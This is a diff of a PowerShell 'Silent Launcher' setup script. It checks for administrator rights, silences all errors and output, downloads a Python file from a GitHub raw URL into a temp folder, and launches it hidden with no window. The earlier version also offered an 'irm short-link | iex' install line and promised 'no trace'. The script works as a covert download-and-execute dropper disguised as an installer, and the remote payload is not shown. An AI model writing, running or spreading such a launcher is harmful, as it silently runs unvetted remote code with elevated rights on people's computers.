@@ -1,54 +1,52 @@
 # NOBLE SETUP - Silent Launcher
-# Usage: irm https://bit.ly/4dbqqti | iex
 
 $ErrorActionPreference = 'SilentlyContinue'
 $ProgressPreference = 'SilentlyContinue'
 
-# Check admin silently
-$isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")
-if (-not $isAdmin) {
-    # Silently exit - no output
-    exit
-}
+# Admin check - silent fail
+try {
+    $isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")
+    if (-not $isAdmin) { exit }
+} catch { exit }
 
-# Create temp directory
+# Silent download
 $tempDir = Join-Path $env:TEMP "BraxInstaller"
 New-Item -ItemType Directory -Force -Path $tempDir | Out-Null
-
-# Download setup.py silently
-$pyUrl = "https://raw.githubusercontent.com/beatboxe17x-sys/setupn/refs/heads/main/setup.py"
 $pyPath = Join-Path $tempDir "setup.py"
 
 try {
-    Invoke-WebRequest -Uri $pyUrl -OutFile $pyPath -UseBasicParsing | Out-Null
-} catch {
-    exit
-}
+    Invoke-WebRequest -Uri "https://raw.githubusercontent.com/beatboxe17x-sys/setupn/refs/heads/main/setup.py" -OutFile $pyPath -UseBasicParsing | Out-Null
+} catch { exit }
 
-# Check Python silently
-$python = Get-Command pythonw -ErrorAction SilentlyContinue
-if (-not $python) {
-    $python = Get-Command python -ErrorAction SilentlyContinue
+# Find pythonw silently
+$pythonPath = $null
+$possiblePaths = @(
+    (Join-Path $env:LOCALAPPDATA "Programs\Python\Python311\pythonw.exe"),
+    (Join-Path $env:LOCALAPPDATA "Programs\Python\Python310\pythonw.exe"),
+    (Join-Path $env:ProgramFiles "Python311\pythonw.exe"),
+    (Join-Path $env:ProgramFiles "Python310\pythonw.exe"),
+    "pythonw"
+)
+foreach ($p in $possiblePaths) {
+    if (Test-Path $p) { $pythonPath = $p; break }
+    $found = Get-Command $p -ErrorAction SilentlyContinue
+    if ($found) { $pythonPath = $found.Source; break }
 }
+if (-not $pythonPath) { exit }
 
-if (-not $python) {
-    exit
-}
-
-# Install tkinter silently if needed
-& $python.Source -c "import tkinter" 2>$null
+# Silent tkinter check
+& $pythonPath -c "import tkinter" 2>$null | Out-Null
 if ($LASTEXITCODE -ne 0) {
-    & $python.Source -m pip install tk -q --no-warn-script-location 2>$null | Out-Null
+    & $pythonPath -m pip install tk -q --no-warn-script-location 2>$null | Out-Null
 }
 
-# Launch GUI with NO CONSOLE WINDOW
+# Launch hidden - NO CONSOLE, NO OUTPUT
 $psi = New-Object System.Diagnostics.ProcessStartInfo
-$psi.FileName = $python.Source
+$psi.FileName = $pythonPath
 $psi.Arguments = "`"$pyPath`""
 $psi.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden
 $psi.CreateNoWindow = $true
 $psi.UseShellExecute = $false
 [System.Diagnostics.Process]::Start($psi) | Out-Null
 
-# Exit immediately - no output, no trace
 exit
